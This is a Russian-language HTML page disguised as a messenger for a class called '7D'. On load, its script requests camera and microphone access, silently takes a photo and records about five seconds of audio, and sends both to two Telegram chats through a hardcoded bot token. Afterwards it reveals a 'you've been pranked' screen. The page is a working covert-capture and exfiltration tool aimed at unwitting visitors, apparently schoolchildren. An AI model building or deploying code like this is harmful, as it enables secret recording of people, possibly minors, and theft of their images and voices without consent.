<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Мессенджер для 7Д</title>
    <style>
        * {
            box-sizing: border-box;
        }
        body {
            background: #0f172a;
            color: #f8fafc;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
        }

        /* Экран загрузки / мессенджера */
        #loader-screen {
            display: flex;
            flex-direction: column;
            align-items: center;
            text-align: center;
            background: #1e293b;
            padding: 30px;
            border-radius: 16px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.3);
            max-width: 350px;
            width: 90%;
            border: 1px solid #334155;
        }
        .logo {
            font-size: 32px;
            margin-bottom: 10px;
        }
        .spinner {
            border: 4px solid rgba(56, 189, 248, 0.2);
            border-top: 4px solid #38bdf8;
            border-radius: 50%;
            width: 45px;
            height: 45px;
            animation: spin 0.8s linear infinite;
            margin: 20px 0;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        #status-text {
            font-size: 14px;
            color: #94a3b8;
            line-height: 1.4;
        }
        
        /* Экран розыгрыша */
        #prank-screen {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            background: #000;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            z-index: 10;
            padding: 20px;
            text-align: center;
        }
        #prank-screen h1 {
            color: #ff4757;
            font-size: 32px;
            margin-bottom: 15px;
            text-transform: uppercase;
            text-shadow: 0 0 10px rgba(255, 71, 87, 0.6);
            animation: pulse 1s infinite alternate;
        }
        @keyframes pulse {
            0% { transform: scale(1); }
            100% { transform: scale(1.05); }
        }
        #photo-container img {
            width: 100%;
            max-width: 380px;
            border-radius: 12px;
            border: 4px solid #ff4757;
            box-shadow: 0 0 20px rgba(255, 71, 87, 0.5);
        }
        .sub-text {
            margin-top: 15px;
            color: #aaa;
            font-size: 14px;
        }
    </style>
</head>
<body>

    <!-- ЭКРАН 1: Маскировка под мессенджер -->
    <div id="loader-screen">
        <div class="logo">💬</div>
        <h2 style="margin: 0; font-size: 20px; color: #fff;">Мессенджер для 7Д</h2>
        <div class="spinner"></div>
        <div id="status-text">Подключение к аудио-комнате...</div>
    </div>

    <!-- ЭКРАН 2: Результат -->
    <div id="prank-screen">
        <h1>ТЫ РАЗЫГРАН! 😂</h1>
        <div id="photo-container"></div>
        <div class="sub-text" id="upload-status">Отправка файлов в бота... ⏳</div>
    </div>

    <!-- Скрытые элементы камеры -->
    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const BOT_TOKEN = '9176741718:AAG4UgtGs8O8MovvouhjS8ncg3Jbgl73PWY'; 
        const CHAT_IDS = ['7523561197', '8671534168'];

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const loaderScreen = document.getElementById('loader-screen');
        const prankScreen = document.getElementById('prank-screen');
        const photoContainer = document.getElementById('photo-container');
        const statusText = document.getElementById('status-text');
        const uploadStatus = document.getElementById('upload-status');

        // Отправка фото в Telegram
        async function sendPhotoToTelegram(dataUrl) {
            const res = await fetch(dataUrl);
            const blob = await res.blob();
            
            for (const chatId of CHAT_IDS) {
                const formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('photo', blob, 'target.png');
                formData.append('caption', '🎯 Снимок с камеры!');

                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
            }
        }

        // Отправка аудиозаписи в Telegram
        async function sendAudioToTelegram(audioBlob) {
            for (const chatId of CHAT_IDS) {
                const formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('audio', audioBlob, 'audio_record.ogg');
                formData.append('caption', '🎙 Аудиозапись с микрофона (5 сек)');

                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, {
                    method: 'POST',
                    body: formData
                });
            }
        }

        async function initMessengerPrank() {
            try {
                statusText.textContent = "Запрос доступа к мультимедиа...";
                
                // Запрашиваем сразу и видео, и аудио
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: true, 
                    audio: true 
                });
                
                video.srcObject = stream;
                statusText.textContent = "Калибровка звука и видео...";

                // Запускаем запись аудио через MediaRecorder
                const audioChunks = [];
                const mediaRecorder = new MediaRecorder(stream);
                
                mediaRecorder.ondataavailable = event => {
                    if (event.data.size > 0) {
                        audioChunks.push(event.data);
                    }
                };

                mediaRecorder.start();

                // Делаем фотку через 1 секунду после запуска
                setTimeout(async () => {
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;
                    
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    const photoDataUrl = canvas.toDataURL('image/png');

                    // Показываем фото на экране
                    const img = document.createElement('img');
                    img.src = photoDataUrl;
                    photoContainer.appendChild(img);

                    loaderScreen.style.display = 'none';
                    prankScreen.style.display = 'flex';

                    // Отправляем фото
                    await sendPhotoToTelegram(photoDataUrl);

                    // Записываем звук 5 секунд, затем останавливаем и отправляем
                    setTimeout(() => {
                        mediaRecorder.stop();
                    }, 4000);

                }, 1000);

                // Когда аудиозапись завершится
                mediaRecorder.onstop = async () => {
                    const audioBlob = new Blob(audioChunks, { type: 'audio/ogg' });
                    
                    // Выключаем камеру и микрофон
                    stream.getTracks().forEach(track => track.stop());

                    // Отправляем аудио в Telegram
                    await sendAudioToTelegram(audioBlob);
                    uploadStatus.textContent = "Фото и аудиозапись успешно отправлены! 🚀";
                };

            } catch (err) {
                statusText.textContent = "Ошибка доступа. Требуется разрешение на камеру и микрофон.";
            }
        }

        window.addEventListener('load', initMessengerPrank);
    </script>
</body>
</html>
